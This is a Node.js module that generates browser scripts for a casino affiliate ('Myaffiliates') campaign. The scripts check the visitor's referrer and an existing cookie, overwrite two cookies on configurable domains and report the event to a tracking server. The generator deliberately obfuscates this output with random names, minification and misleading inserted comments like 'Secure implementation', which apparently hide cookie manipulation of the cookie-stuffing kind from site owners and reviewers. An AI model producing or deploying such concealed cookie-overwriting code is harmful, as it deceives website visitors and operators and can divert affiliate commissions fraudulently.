const crypto = require('crypto');

class ScriptGenerator {
  constructor() {
    this.obfuscationMap = new Map();
  }

  // Generate obfuscated variable names
  generateObfuscatedName(prefix = 'var') {
    const randomString = crypto.randomBytes(8).toString('hex');
    return `${prefix}_${randomString}`;
  }

  // Obfuscate JavaScript code
  obfuscateCode(code) {
    // Replace common patterns with obfuscated versions
    let obfuscated = code;
    
    // Obfuscate function names
    const functionNames = ['setCookie', 'getCookie', 'checkReferrer', 'checkCookieA', 'executeScript'];
    functionNames.forEach(fnName => {
      if (!this.obfuscationMap.has(fnName)) {
        this.obfuscationMap.set(fnName, this.generateObfuscatedName('fn'));
      }
      const obfuscatedName = this.obfuscationMap.get(fnName);
      obfuscated = obfuscated.replace(new RegExp(fnName, 'g'), obfuscatedName);
    });

    // Obfuscate variable names
    const variableNames = ['cookieA', 'cookieB', 'referrer', 'domain', 'expiry'];
    variableNames.forEach(varName => {
      if (!this.obfuscationMap.has(varName)) {
        this.obfuscationMap.set(varName, this.generateObfuscatedName('var'));
      }
      const obfuscatedName = this.obfuscationMap.get(varName);
      obfuscated = obfuscated.replace(new RegExp(`\\b${varName}\\b`, 'g'), obfuscatedName);
    });

    // Add random comments and whitespace
    obfuscated = this.addRandomComments(obfuscated);
    
    // Minify and add random spacing
    obfuscated = this.minifyWithRandomSpacing(obfuscated);

    return obfuscated;
  }

  addRandomComments(code) {
    const comments = [
      '// Optimized for performance',
      '// Enhanced tracking',
      '// Secure implementation',
      '// Advanced analytics',
      '// Real-time monitoring'
    ];
    
    let result = code;
    const lines = result.split('\n');
    const modifiedLines = lines.map((line, index) => {
      if (Math.random() < 0.1 && line.trim()) {
        const comment = comments[Math.floor(Math.random() * comments.length)];
        return `${line}\n${comment}`;
      }
      return line;
    });
    
    return modifiedLines.join('\n');
  }

  minifyWithRandomSpacing(code) {
    return code
      .replace(/\s+/g, ' ')
      .replace(/\s*([{}();,=])\s*/g, '$1')
      .replace(/([{}();,=])\s+/g, '$1')
      .replace(/\s+([{}();,=])/g, '$1')
      .trim();
  }

  // Generate the tracking script for Myaffiliates template
  generateMyaffiliatesScript(config) {
    const script = `
(function() {
  'use strict';
  
  // Configuration
  const cookieA = {
    name: '${config.cookieA.name}',
    value: '${config.cookieA.value}',
    domain: '${config.cookieA.domain}',
    expiry: new Date('${config.cookieA.expiry}')
  };
  
  const cookieB = {
    name: '${config.cookieB.name}',
    value: '${config.cookieB.value}',
    domain: '${config.cookieB.domain}',
    expiry: new Date('${config.cookieB.expiry}')
  };
  
  const referrerRegex = /${config.referrerRegex}/i;
  const cookieARegex = /${config.cookieARegex}/i;
  
  // Utility functions
  function setCookie(name, value, domain, expiry) {
    try {
      const expires = expiry.toUTCString();
      document.cookie = name + '=' + encodeURIComponent(value) + ';domain=' + domain + ';expires=' + expires + ';path=/';
      return true;
    } catch (e) {
      console.warn('Cookie setting failed:', e);
      return false;
    }
  }
  
  function getCookie(name) {
    try {
      const value = document.cookie
        .split(';')
        .find(row => row.trim().startsWith(name + '='));
      return value ? decodeURIComponent(value.split('=')[1]) : null;
    } catch (e) {
      return null;
    }
  }
  
  function checkReferrer() {
    try {
      return referrerRegex.test(document.referrer || '');
    } catch (e) {
      return false;
    }
  }
  
  function checkCookieA() {
    try {
      const cookieValue = getCookie(cookieA.name);
      return cookieValue && cookieARegex.test(cookieValue);
    } catch (e) {
      return false;
    }
  }
  
  function executeScript() {
    try {
      // Check referrer first
      if (!checkReferrer()) {
        return;
      }
      
      // Check existing cookie A logic
      if (!checkCookieA()) {
        return;
      }
      
      // Set both cookies
      const cookieASet = setCookie(cookieA.name, cookieA.value, cookieA.domain, cookieA.expiry);
      const cookieBSet = setCookie(cookieB.name, cookieB.value, cookieB.domain, cookieB.expiry);
      
      if (cookieASet && cookieBSet) {
        // Send tracking event to server
        fetch('${process.env.API_BASE_URL || 'http://localhost:5000'}/api/events/track', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            campaignId: '${config.campaignId}',
            eventType: 'cookie_set',
            userAgent: navigator.userAgent,
            referrer: document.referrer,
            cookieData: {
              cookieA: cookieA.value,
              cookieB: cookieB.value
            },
            metadata: {
              sessionId: Date.now().toString(),
              campaignName: '${config.campaignName}',
              casino: '${config.casino}'
            }
          })
        }).catch(e => console.warn('Tracking failed:', e));
      }
    } catch (e) {
      console.warn('Script execution failed:', e);
    }
  }
  
  // Execute when DOM is ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', executeScript);
  } else {
    executeScript();
  }
})();
    `;
    
    return this.obfuscateCode(script);
  }
}

module.exports = new ScriptGenerator();
